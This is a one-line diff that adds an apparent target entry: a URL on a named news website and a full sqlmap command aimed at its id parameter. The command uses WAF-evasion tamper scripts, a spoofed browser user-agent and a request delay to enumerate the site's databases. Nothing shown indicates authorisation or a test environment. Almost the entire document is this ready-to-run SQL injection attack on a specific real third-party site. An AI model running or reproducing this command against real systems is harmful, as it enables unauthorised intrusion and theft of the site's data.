@@ -1,0 +1,1 @@
+https://www.yemenakhbar.com/index.php?id=1 (GET)  # sqlmap.py -u https://www.yemenakhbar.com/index.php?id=1 --tamper=versionedkeywords,space2comment,randomcase "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --delay=1 --batch --dbs
